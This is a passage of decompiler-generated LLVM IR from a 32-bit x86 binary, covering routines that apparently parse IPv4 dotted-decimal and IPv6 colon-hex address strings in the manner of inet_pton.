  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8051acc = ptrtoint i32* %stack_var_-44 to i32
  %v2_8051acf = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8051acf, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_8051b1715 = inttoptr i32 %v0_8051aca to i8*
  %v2_8051b1716 = load i8, i8* %v1_8051b1715, align 1
  %v3_8051b1717 = sext i8 %v2_8051b1716 to i32
  store i32 %v3_8051b1717, i32* @ecx, align 4
  %v1_8051b1a18 = add i32 %v0_8051aca, 1
  store i32 %v1_8051b1a18, i32* %ebx.global-to-local, align 4
  %v1_8051b1b19 = icmp eq i8 %v2_8051b1716, 0
  store i1 %v1_8051b1b19, i1* %zf.global-to-local, align 1
  %v1_8051b1d21 = icmp eq i1 %v1_8051b1b19, false
  br i1 %v1_8051b1d21, label %dec_label_pc_8051ada, label %dec_label_pc_8051b1f

dec_label_pc_8051ada:                             ; preds = %dec_label_pc_8051ac0, %dec_label_pc_8051b17.backedge
  %v3_8051b1723 = phi i32 [ %v3_8051b17, %dec_label_pc_8051b17.backedge ], [ %v3_8051b1717, %dec_label_pc_8051ac0 ]
  %v2_8051b1722 = phi i8 [ %v2_8051b17, %dec_label_pc_8051b17.backedge ], [ %v2_8051b1716, %dec_label_pc_8051ac0 ]
  %v1_8051ada = add nsw i32 %v3_8051b1723, -48
  store i32 %v1_8051ada, i32* @eax, align 4
  %v9_8051add = icmp eq i8 %v2_8051b1722, 57
  store i1 %v9_8051add, i1* %zf.global-to-local, align 1
  %v6_8051ae0 = icmp ugt i32 %v1_8051ada, 9
  br i1 %v6_8051ae0, label %dec_label_pc_8051b03, label %dec_label_pc_8051ae2

dec_label_pc_8051ae2:                             ; preds = %dec_label_pc_8051ada
  %v0_8051ae2 = load i32, i32* @esi, align 4
  %v1_8051ae2 = inttoptr i32 %v0_8051ae2 to i8*
  %v2_8051ae2 = load i8, i8* %v1_8051ae2, align 1
  %v2_8051ae5 = zext i8 %v2_8051ae2 to i32
  %v3_8051ae5 = mul nuw nsw i32 %v2_8051ae5, 10
  %v3_8051ae8 = add nsw i32 %v3_8051ae5, %v1_8051ada
  store i32 %v3_8051ae8, i32* @eax, align 4
  %v9_8051aec = icmp eq i32 %v3_8051ae8, 255
  store i1 %v9_8051aec, i1* %zf.global-to-local, align 1
  %v6_8051af1 = icmp ugt i32 %v3_8051ae8, 255
  br i1 %v6_8051af1, label %dec_label_pc_8051b3c, label %dec_label_pc_8051af3

dec_label_pc_8051af3:                             ; preds = %dec_label_pc_8051ae2
  %v0_8051af3 = load i32, i32* @edx, align 4
  %v1_8051af3 = icmp eq i32 %v0_8051af3, 0
  store i1 %v1_8051af3, i1* %zf.global-to-local, align 1
  %v1_8051af5 = trunc i32 %v3_8051ae8 to i8
  store i8 %v1_8051af5, i8* %v1_8051ae2, align 1
  %v0_8051af7 = load i1, i1* %zf.global-to-local, align 1
  %v1_8051af7 = icmp eq i1 %v0_8051af7, false
  br i1 %v1_8051af7, label %dec_label_pc_8051b17.backedge, label %dec_label_pc_8051af9

dec_label_pc_8051af9:                             ; preds = %dec_label_pc_8051af3
  %v0_8051af9 = load i32, i32* @edi, align 4
  %v1_8051af9 = add i32 %v0_8051af9, 1
  store i32 %v1_8051af9, i32* @edi, align 4
  %v1_8051afa = add i32 %v0_8051af9, -3
  %v6_8051afa = sub i32 2, %v0_8051af9
  %v7_8051afa = and i32 %v6_8051afa, %v1_8051af9
  %v8_8051afa = icmp slt i32 %v7_8051afa, 0
  %v9_8051afa = icmp eq i32 %v1_8051afa, 0
  store i1 %v9_8051afa, i1* %zf.global-to-local, align 1
  %v10_8051afa = icmp slt i32 %v1_8051afa, 0
  %v3_8051afd = icmp eq i1 %v10_8051afa, %v8_8051afa
  %v4_8051afd = icmp eq i1 %v9_8051afa, false
  %v5_8051afd = and i1 %v4_8051afd, %v3_8051afd
  br i1 %v5_8051afd, label %dec_label_pc_8051b3c, label %dec_label_pc_8051aff

dec_label_pc_8051aff:                             ; preds = %dec_label_pc_8051af9
  %v0_8051aff = load i32, i32* @edx, align 4
  %v1_8051aff = and i32 %v0_8051aff, -256
  %v2_8051aff = or i32 %v1_8051aff, 1
  store i32 %v2_8051aff, i32* @edx, align 4
  br label %dec_label_pc_8051b17.backedge

dec_label_pc_8051b03:                             ; preds = %dec_label_pc_8051ada
  %v9_8051b03 = icmp eq i8 %v2_8051b1722, 46
  store i1 %v9_8051b03, i1* %zf.global-to-local, align 1
  %v1_8051b06 = icmp eq i1 %v9_8051b03, false
  br i1 %v1_8051b06, label %dec_label_pc_8051b3c, label %dec_label_pc_8051b08

dec_label_pc_8051b08:                             ; preds = %dec_label_pc_8051b03
  %v0_8051b08 = load i32, i32* @edx, align 4
  %v1_8051b08 = icmp eq i32 %v0_8051b08, 0
  store i1 %v1_8051b08, i1* %zf.global-to-local, align 1
  br i1 %v1_8051b08, label %dec_label_pc_8051b3c, label %dec_label_pc_8051b0c

dec_label_pc_8051b0c:                             ; preds = %dec_label_pc_8051b08
  %v0_8051b0c = load i32, i32* @edi, align 4
  %v9_8051b0c = icmp eq i32 %v0_8051b0c, 4
  store i1 %v9_8051b0c, i1* %zf.global-to-local, align 1
  br i1 %v9_8051b0c, label %dec_label_pc_8051b3c, label %dec_label_pc_8051b11

dec_label_pc_8051b11:                             ; preds = %dec_label_pc_8051b0c
  %v0_8051b11 = load i32, i32* @esi, align 4
  %v1_8051b11 = add i32 %v0_8051b11, 1
  store i32 %v1_8051b11, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_8051b14 = inttoptr i32 %v1_8051b11 to i8*
  store i8 0, i8* %v1_8051b14, align 1
  br label %dec_label_pc_8051b17.backedge

dec_label_pc_8051b17.backedge:                    ; preds = %dec_label_pc_8051b11, %dec_label_pc_8051aff, %dec_label_pc_8051af3
  %v0_8051b17.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b17 = inttoptr i32 %v0_8051b17.pre to i8*
  %v2_8051b17 = load i8, i8* %v1_8051b17, align 1
  %v3_8051b17 = sext i8 %v2_8051b17 to i32
  store i32 %v3_8051b17, i32* @ecx, align 4
  %v1_8051b1a = add i32 %v0_8051b17.pre, 1
  store i32 %v1_8051b1a, i32* %ebx.global-to-local, align 4
  %v1_8051b1b = icmp eq i8 %v2_8051b17, 0
  store i1 %v1_8051b1b, i1* %zf.global-to-local, align 1
  %v1_8051b1d = icmp eq i1 %v1_8051b1b, false
  br i1 %v1_8051b1d, label %dec_label_pc_8051ada, label %dec_label_pc_8051b17.dec_label_pc_8051b1f_crit_edge

dec_label_pc_8051b17.dec_label_pc_8051b1f_crit_edge: ; preds = %dec_label_pc_8051b17.backedge
  %v0_8051b1f.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051b1f

dec_label_pc_8051b1f:                             ; preds = %dec_label_pc_8051b17.dec_label_pc_8051b1f_crit_edge, %dec_label_pc_8051ac0
  %v0_8051b1f = phi i32 [ %v0_8051b1f.pre, %dec_label_pc_8051b17.dec_label_pc_8051b1f_crit_edge ], [ 0, %dec_label_pc_8051ac0 ]
  %v10_8051b1f = icmp eq i32 %v0_8051b1f, 3
  store i1 %v10_8051b1f, i1* %zf.global-to-local, align 1
  %v7_8051b22 = icmp sgt i32 %v0_8051b1f, 3
  br i1 %v7_8051b22, label %dec_label_pc_8051b24, label %dec_label_pc_8051b3c

dec_label_pc_8051b24:                             ; preds = %dec_label_pc_8051b1f
  %v0_8051b24 = load i32, i32* @eax, align 4
  %v3_8051b2d = bitcast i32* %stack_var_-20 to i16*
  %v4_8051b2d = call i32 @function_804d4b8(i16* %v3_8051b2d, i32 4, i32 %v0_8051b24)
  %v0_8051b37 = load i32, i32* @esp, align 4
  %v6_8051b37 = icmp eq i32 %v0_8051b37, -16
  store i1 %v6_8051b37, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8051b3e

dec_label_pc_8051b3c:                             ; preds = %dec_label_pc_8051b0c, %dec_label_pc_8051b08, %dec_label_pc_8051b03, %dec_label_pc_8051af9, %dec_label_pc_8051ae2, %dec_label_pc_8051b1f
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_8051b3e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051b3e

dec_label_pc_8051b3e:                             ; preds = %dec_label_pc_8051b24, %dec_label_pc_8051b3c
  %v0_8051b3e = phi i32 [ %v15_8051acc, %dec_label_pc_8051b24 ], [ %v0_8051b3e.pre, %dec_label_pc_8051b3c ]
  %v0_8051b45 = phi i32 [ 1, %dec_label_pc_8051b24 ], [ 0, %dec_label_pc_8051b3c ]
  %v9_8051b3e = icmp eq i32 %v0_8051b3e, -28
  store i1 %v9_8051b3e, i1* %zf.global-to-local, align 1
  %v2_8051b41 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051b41, i32* @ebx, align 4
  store i32 %v0_8051ac6, i32* @esi, align 4
  ret i32 %v0_8051b45

; uselistorder directives
  uselistorder i32 %v0_8051b1f, { 1, 0 }
  uselistorder i32 %v3_8051b17, { 1, 0 }
  uselistorder i8 %v2_8051b17, { 1, 2, 0 }
  uselistorder i1 %v9_8051b0c, { 1, 0 }
  uselistorder i32 %v1_8051afa, { 1, 0 }
  uselistorder i32 %v3_8051ae8, { 1, 2, 0, 3 }
  uselistorder i8 %v2_8051b1722, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 14 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 255, { 5, 2, 1, 0, 4, 6, 7, 11, 3, 8, 9, 10 }
  uselistorder label %dec_label_pc_8051b3e, { 1, 0 }
  uselistorder label %dec_label_pc_8051b3c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8051ada, { 1, 0 }
}

define i32 @function_8051b46(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051b46:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8051b46 = load i32, i32* @ebp, align 4
  %v0_8051b47 = load i32, i32* @edi, align 4
  %v0_8051b48 = load i32, i32* @esi, align 4
  %v0_8051b49 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8051b51 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8051b51, i32* @edi, align 4
  %v9_8051b55 = icmp eq i32 %arg1, 2
  br i1 %v9_8051b55, label %dec_label_pc_8051b65, label %dec_label_pc_8051b5a

dec_label_pc_8051b5a:                             ; preds = %dec_label_pc_8051b46
  %v9_8051b5a = icmp eq i32 %arg1, 10
  %v1_8051b5d = icmp eq i1 %v9_8051b5a, false
  br i1 %v1_8051b5d, label %dec_label_pc_8051cf6, label %dec_label_pc_8051b75

dec_label_pc_8051b65:                             ; preds = %dec_label_pc_8051b46
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8051b51, i32* @eax, align 4
  %v3_8051b6b = call i32 @function_8051ac0(i32 %v0_8051b49, i32 %v0_8051b48, i32 %v0_8051b47)
  store i32 %v3_8051b6b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d08

dec_label_pc_8051b75:                             ; preds = %dec_label_pc_8051b5a
  %v2_8051b7a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051b7a, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_8051b7f = call i32 @function_804d4e0(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_8051b7f, i32* @ebx, align 4
  %v2_8051b86 = add i32 %v5_8051b7f, 16
  store i32 %v2_8051b86, i32* %eax.global-to-local, align 4
  %v0_8051b90 = load i32, i32* @edi, align 4
  %v1_8051b90 = inttoptr i32 %v0_8051b90 to i8*
  %v2_8051b90 = load i8, i8* %v1_8051b90, align 1
  %v11_8051b90 = icmp eq i8 %v2_8051b90, 58
  %v1_8051b93 = icmp eq i1 %v11_8051b90, false
  br i1 %v1_8051b93, label %dec_label_pc_8051c26, label %dec_label_pc_8051b95

dec_label_pc_8051b95:                             ; preds = %dec_label_pc_8051b75
  %v1_8051b95 = add i32 %v0_8051b90, 1
  store i32 %v1_8051b95, i32* @edi, align 4
  %v1_8051b96 = inttoptr i32 %v1_8051b95 to i8*
  %v2_8051b96 = load i8, i8* %v1_8051b96, align 1
  %v11_8051b96 = icmp eq i8 %v2_8051b96, 58
  %v1_8051b99 = icmp eq i1 %v11_8051b96, false
  br i1 %v1_8051b99, label %dec_label_pc_8051d06, label %dec_label_pc_8051c26

dec_label_pc_8051bad:                             ; preds = %dec_label_pc_8051c66
  %v0_8051bad = load i32, i32* @ecx, align 4
  %v0_8051bae = load i32, i32* @edi, align 4
  %v1_8051bae = add i32 %v0_8051bae, 1
  store i32 %v1_8051bae, i32* @edi, align 4
  %v7_8051bb6 = call i32 @function_8052674(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8055074.208, i32 0, i32 0), i32 %v2_8051c6d, i32 %v0_8051bad, i32 %v0_8051bad)
  store i32 %v7_8051bb6, i32* %eax.global-to-local, align 4
  %v1_8051bbe = icmp eq i32 %v7_8051bb6, 0
  br i1 %v1_8051bbe, label %dec_label_pc_8051bdd, label %dec_label_pc_8051bc2

dec_label_pc_8051bc2:                             ; preds = %dec_label_pc_8051bad
  %v0_8051bc2 = load i32, i32* @ebp, align 4
  %v2_8051bc2 = mul i32 %v0_8051bc2, 16
  %v1_8051bc5 = add i32 %v7_8051bb6, -134566004
  store i32 %v1_8051bc5, i32* %eax.global-to-local, align 4
  %v2_8051bca = or i32 %v2_8051bc2, %v1_8051bc5
  store i32 %v2_8051bca, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_8051bca, 65536
  br i1 %tmp, label %dec_label_pc_8051bc2.dec_label_pc_8051c66.outer_crit_edge, label %dec_label_pc_8051d06

dec_label_pc_8051bc2.dec_label_pc_8051c66.outer_crit_edge: ; preds = %dec_label_pc_8051bc2
  %v0_8051c66.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051c66.outer

dec_label_pc_8051c66.outer:                       ; preds = %dec_label_pc_8051bc2.dec_label_pc_8051c66.outer_crit_edge, %dec_label_pc_8051c26
  %v0_8051c66.pre = phi i32 [ %v0_8051c66.pre.pre, %dec_label_pc_8051bc2.dec_label_pc_8051c66.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_8051c26 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8051bc2.dec_label_pc_8051c66.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_8051c26 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8051bc2.dec_label_pc_8051c66.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_8051c26 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8051bc2.dec_label_pc_8051c66.outer_crit_edge ], [ 0, %dec_label_pc_8051c26 ]
  %v4_8051be2 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8051be7 = icmp eq i1 %v4_8051be2, false
  br label %dec_label_pc_8051c66

dec_label_pc_8051bdd:                             ; preds = %dec_label_pc_8051bad
  %v0_8051bdd = load i32, i32* @esi, align 4
  %v9_8051bdd = icmp eq i32 %v0_8051bdd, 58
  %v1_8051be0 = icmp eq i1 %v9_8051bdd, false
  br i1 %v1_8051be0, label %dec_label_pc_8051c32, label %dec_label_pc_8051be2

dec_label_pc_8051be2:                             ; preds = %dec_label_pc_8051bdd
  br i1 %v1_8051be7, label %dec_label_pc_8051bfe, label %dec_label_pc_8051be9

dec_label_pc_8051be9:                             ; preds = %dec_label_pc_8051be2
  %v5_8051be9 = icmp eq i8* %stack_var_-44.1, null
  %v1_8051bee = icmp eq i1 %v5_8051be9, false
  br i1 %v1_8051bee, label %dec_label_pc_8051d06, label %dec_label_pc_8051bf4

dec_label_pc_8051bf4:                             ; preds = %dec_label_pc_8051be9
  %v0_8051bf4 = load i32, i32* @ebx, align 4
  %v5_8051bf4 = inttoptr i32 %v0_8051bf4 to i8*
  %v0_8051bf8 = load i32, i32* @edi, align 4
  %v5_8051bf8 = inttoptr i32 %v0_8051bf8 to i8*
  br label %dec_label_pc_8051c66

dec_label_pc_8051bfe:                             ; preds = %dec_label_pc_8051be2
  %v0_8051bfe = load i32, i32* @edi, align 4
  %v1_8051bfe = inttoptr i32 %v0_8051bfe to i8*
  %v2_8051bfe = load i8, i8* %v1_8051bfe, align 1
  %v3_8051bfe = icmp eq i8 %v2_8051bfe, 0
  br i1 %v3_8051bfe, label %dec_label_pc_8051d06, label %dec_label_pc_8051c07

dec_label_pc_8051c07:                             ; preds = %dec_label_pc_8051bfe
  %v0_8051c07 = load i32, i32* @ebx, align 4
  %v1_8051c07 = add i32 %v0_8051c07, 2
  store i32 %v1_8051c07, i32* @edx, align 4
  %v6_8051c0e = icmp ugt i32 %v1_8051c07, %v2_8051b86
  br i1 %v6_8051c0e, label %dec_label_pc_8051d06, label %dec_label_pc_8051c14

dec_label_pc_8051c14:                             ; preds = %dec_label_pc_8051c07
  %v0_8051c14 = load i32, i32* @ebp, align 4
  %v2_8051c16 = udiv i32 %v0_8051c14, 256
  %v4_8051c16 = trunc i32 %v2_8051c16 to i8
  %v3_8051c19 = inttoptr i32 %v0_8051c07 to i8*
  store i8 %v4_8051c16, i8* %v3_8051c19, align 1
  %v0_8051c1b = load i32, i32* @ebp, align 4
  store i32 %v0_8051c1b, i32* %eax.global-to-local, align 4
  %v1_8051c1d = trunc i32 %v0_8051c1b to i8
  %v2_8051c1d = load i32, i32* @ebx, align 4
  %v3_8051c1d = add i32 %v2_8051c1d, 1
  %v4_8051c1d = inttoptr i32 %v3_8051c1d to i8*
  store i8 %v1_8051c1d, i8* %v4_8051c1d, align 1
  %v0_8051c20 = load i32, i32* @edx, align 4
  store i32 %v0_8051c20, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051c26

dec_label_pc_8051c26:                             ; preds = %dec_label_pc_8051b75, %dec_label_pc_8051b95, %dec_label_pc_8051c14
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8051c14 ], [ %v1_8051b95, %dec_label_pc_8051b95 ], [ %v0_8051b90, %dec_label_pc_8051b75 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8051c14 ], [ null, %dec_label_pc_8051b95 ], [ null, %dec_label_pc_8051b75 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8051c66.outer

dec_label_pc_8051c32:                             ; preds = %dec_label_pc_8051bdd
  %v9_8051c32 = icmp eq i32 %v0_8051bdd, 46
  %v1_8051c35 = icmp eq i1 %v9_8051c32, false
  br i1 %v1_8051c35, label %dec_label_pc_8051d06, label %dec_label_pc_8051c3b

dec_label_pc_8051c3b:                             ; preds = %dec_label_pc_8051c32
  %v0_8051c3b = load i32, i32* @ebx, align 4
  %v1_8051c3b = add i32 %v0_8051c3b, 4
  store i32 %v1_8051c3b, i32* @esi, align 4
  %v6_8051c42 = icmp ugt i32 %v1_8051c3b, %v2_8051b86
  br i1 %v6_8051c42, label %dec_label_pc_8051d06, label %dec_label_pc_8051c48

dec_label_pc_8051c48:                             ; preds = %dec_label_pc_8051c3b
  %v4_8051c48 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8051c48, i32* @eax, align 4
  store i32 %v0_8051c3b, i32* @edx, align 4
  store i32 %v1_8051c3b, i32* @ebx, align 4
  %v2_8051c50 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8051c50 = call i32 @function_8051ac0(i32 %stack_var_-48.0.ph, i32 %v2_8051c50, i32 %v2_8051b86)
  store i32 %v5_8051c50, i32* %eax.global-to-local, align 4
  %tmp61 = icmp slt i32 %v5_8051c50, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8051c9d, label %dec_label_pc_8051d06

dec_label_pc_8051c66:                             ; preds = %dec_label_pc_8051c66.outer, %dec_label_pc_8051bf4
  %v0_8051c66 = phi i32 [ %v0_8051bf8, %dec_label_pc_8051bf4 ], [ %v0_8051c66.pre, %dec_label_pc_8051c66.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8051bf4, %dec_label_pc_8051bf4 ], [ %stack_var_-44.1.ph, %dec_label_pc_8051c66.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8051bf8, %dec_label_pc_8051bf4 ], [ %stack_var_-36.1.ph, %dec_label_pc_8051c66.outer ]
  %v1_8051c66 = inttoptr i32 %v0_8051c66 to i8*
  %v2_8051c66 = load i8, i8* %v1_8051c66, align 1
  %v3_8051c66 = sext i8 %v2_8051c66 to i32
  store i32 %v3_8051c66, i32* %eax.global-to-local, align 4
  %v2_8051c6d = call i32 @function_8052654(i32 %v3_8051c66)
  store i32 %v2_8051c6d, i32* %eax.global-to-local, align 4
  %v1_8051c75 = icmp eq i32 %v2_8051c6d, 0
  store i32 %v2_8051c6d, i32* @esi, align 4
  %v1_8051c79 = icmp eq i1 %v1_8051c75, false
  br i1 %v1_8051c79, label %dec_label_pc_8051bad, label %dec_label_pc_8051c7f

dec_label_pc_8051c7f:                             ; preds = %dec_label_pc_8051c66
  br i1 %v4_8051be2, label %dec_label_pc_8051c9d, label %dec_label_pc_8051c86

dec_label_pc_8051c86:                             ; preds = %dec_label_pc_8051c7f
  %v0_8051c86 = load i32, i32* @ebx, align 4
  %v1_8051c86 = add i32 %v0_8051c86, 2
  store i32 %v1_8051c86, i32* @edx, align 4
  %v6_8051c8d = icmp ugt i32 %v1_8051c86, %v2_8051b86
  br i1 %v6_8051c8d, label %dec_label_pc_8051d06, label %dec_label_pc_8051c8f

dec_label_pc_8051c8f:                             ; preds = %dec_label_pc_8051c86
  %v0_8051c8f = load i32, i32* @ebp, align 4
  %v2_8051c91 = udiv i32 %v0_8051c8f, 256
  %v4_8051c91 = trunc i32 %v2_8051c91 to i8
  %v3_8051c94 = inttoptr i32 %v0_8051c86 to i8*
  store i8 %v4_8051c91, i8* %v3_8051c94, align 1
  %v0_8051c96 = load i32, i32* @ebp, align 4
  store i32 %v0_8051c96, i32* %eax.global-to-local, align 4
  %v1_8051c98 = trunc i32 %v0_8051c96 to i8
  %v2_8051c98 = load i32, i32* @ebx, align 4
  %v3_8051c98 = add i32 %v2_8051c98, 1
  %v4_8051c98 = inttoptr i32 %v3_8051c98 to i8*
  store i8 %v1_8051c98, i8* %v4_8051c98, align 1
  %v0_8051c9b = load i32, i32* @edx, align 4
  store i32 %v0_8051c9b, i32* @ebx, align 4
  br label %dec_label_pc_8051c9d

dec_label_pc_8051c9d:                             ; preds = %dec_label_pc_8051c7f, %dec_label_pc_8051c48, %dec_label_pc_8051c8f
  %v4_8051c9d = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8051c9d = icmp eq i8* %stack_var_-44.1, null
  %v0_8051cd5.pre = load i32, i32* @ebx, align 4
  br i1 %v5_8051c9d, label %dec_label_pc_8051cd5, label %dec_label_pc_8051ca4

dec_label_pc_8051ca4:                             ; preds = %dec_label_pc_8051c9d
  store i32 1, i32* @esi, align 4
  %v6_8051cab = sub i32 %v0_8051cd5.pre, %v4_8051c9d
  store i32 %v6_8051cab, i32* @edi, align 4
  %v16_8051caf = icmp eq i32 %v0_8051cd5.pre, %v2_8051b86
  %v1_8051cb3 = icmp eq i1 %v16_8051caf, false
  br i1 %v1_8051cb3, label %dec_label_pc_8051ccd.preheader, label %dec_label_pc_8051d06

dec_label_pc_8051ccd.preheader:                   ; preds = %dec_label_pc_8051ca4
  %v3_8051ccd88 = inttoptr i32 %v6_8051cab to i8*
  %v9_8051ccf93 = icmp slt i8* %v3_8051ccd88, inttoptr (i32 1 to i8*)
  br i1 %v9_8051ccf93, label %dec_label_pc_8051cd1, label %dec_label_pc_8051cb7

dec_label_pc_8051cb7:                             ; preds = %dec_label_pc_8051ccd.preheader, %dec_label_pc_8051cb7
  %v0_8051cc595 = phi i32 [ %v0_8051ccd.pre, %dec_label_pc_8051cb7 ], [ 1, %dec_label_pc_8051ccd.preheader ]
  %v0_8051cb794 = phi i32 [ %v1_8051ccd.pre, %dec_label_pc_8051cb7 ], [ %v6_8051cab, %dec_label_pc_8051ccd.preheader ]
  %v2_8051cbd = sub i32 %v0_8051cb794, %v0_8051cc595
  %v6_8051cbf = add i32 %v2_8051cbd, %v4_8051c9d
  store i32 %v6_8051cbf, i32* %eax.global-to-local, align 4
  %v2_8051cc3 = sub i32 %v2_8051b86, %v0_8051cc595
  store i32 %v2_8051cc3, i32* @ecx, align 4
  %v1_8051cc5 = add i32 %v0_8051cc595, 1
  store i32 %v1_8051cc5, i32* @esi, align 4
  %v1_8051cc6 = inttoptr i32 %v6_8051cbf to i8*
  %v2_8051cc6 = load i8, i8* %v1_8051cc6, align 1
  %v3_8051cc6 = zext i8 %v2_8051cc6 to i32
  %v4_8051cc6 = load i32, i32* @edx, align 4
  %v5_8051cc6 = and i32 %v4_8051cc6, -256
  %v6_8051cc6 = or i32 %v5_8051cc6, %v3_8051cc6
  store i32 %v6_8051cc6, i32* @edx, align 4
  %v3_8051cc8 = inttoptr i32 %v2_8051cc3 to i8*
  store i8 %v2_8051cc6, i8* %v3_8051cc8, align 1
  %v0_8051cca = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cca = inttoptr i32 %v0_8051cca to i8*
  store i8 0, i8* %v1_8051cca, align 1
  %v0_8051ccd.pre = load i32, i32* @esi, align 4
  %v1_8051ccd.pre = load i32, i32* @edi, align 4
  %v2_8051ccd = inttoptr i32 %v0_8051ccd.pre to i8*
  %v3_8051ccd = inttoptr i32 %v1_8051ccd.pre to i8*
  %v9_8051ccf = icmp sgt i8* %v2_8051ccd, %v3_8051ccd
  br i1 %v9_8051ccf, label %dec_label_pc_8051cd1, label %dec_label_pc_8051cb7

dec_label_pc_8051cd1:                             ; preds = %dec_label_pc_8051cb7, %dec_label_pc_8051ccd.preheader
  br label %dec_label_pc_8051cd5

dec_label_pc_8051cd5:                             ; preds = %dec_label_pc_8051c9d, %dec_label_pc_8051cd1
  %v0_8051cd5 = phi i32 [ %v2_8051b86, %dec_label_pc_8051cd1 ], [ %v0_8051cd5.pre, %dec_label_pc_8051c9d ]
  %v16_8051cd5 = icmp eq i32 %v0_8051cd5, %v2_8051b86
  %v1_8051cd9 = icmp eq i1 %v16_8051cd5, false
  br i1 %v1_8051cd9, label %dec_label_pc_8051d06, label %dec_label_pc_8051cdb

dec_label_pc_8051cdb:                             ; preds = %dec_label_pc_8051cd5
  store i32 %v2_8051b7a, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_8051ce7 = call i32 @function_804d4b8(i16* %tmp63, i32 %v2_8051b7a, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d08

dec_label_pc_8051cf6:                             ; preds = %dec_label_pc_8051b5a
  %v1_8051cf6 = call i32 @function_804baa4(i32 %v0_8051b49)
  %v1_8051cfb = inttoptr i32 %v1_8051cf6 to i32*
  store i32 97, i32* %v1_8051cfb, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d08

dec_label_pc_8051d06:                             ; preds = %dec_label_pc_8051c07, %dec_label_pc_8051bfe, %dec_label_pc_8051bc2, %dec_label_pc_8051be9, %dec_label_pc_8051ca4, %dec_label_pc_8051c48, %dec_label_pc_8051cd5, %dec_label_pc_8051c86, %dec_label_pc_8051c3b, %dec_label_pc_8051c32, %dec_label_pc_8051b95
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d08

dec_label_pc_8051d08:                             ; preds = %dec_label_pc_8051cf6, %dec_label_pc_8051cdb, %dec_label_pc_8051b65, %dec_label_pc_8051d06
  %v0_8051d0f = phi i32 [ -1, %dec_label_pc_8051cf6 ], [ 1, %dec_label_pc_8051cdb ], [ %v3_8051b6b, %dec_label_pc_8051b65 ], [ 0, %dec_label_pc_8051d06 ]
  store i32 %v0_8051b49, i32* @ebx, align 4
  store i32 %v0_8051b48, i32* @esi, align 4
  store i32 %v0_8051b47, i32* @edi, align 4
  store i32 %v0_8051b46, i32* @ebp, align 4
  ret i32 %v0_8051d0f

; uselistorder directives
  uselistorder i32 %v1_8051ccd.pre, { 1, 0 }
  uselistorder i32 %v0_8051ccd.pre, { 1, 0 }
  uselistorder i32 %v0_8051cc595, { 2, 1, 0 }
  uselistorder i32 %v0_8051cd5.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8051c6d, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_8051b86, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_8051b49, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_8051ac0, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8051d08, { 3, 0, 1, 2 }
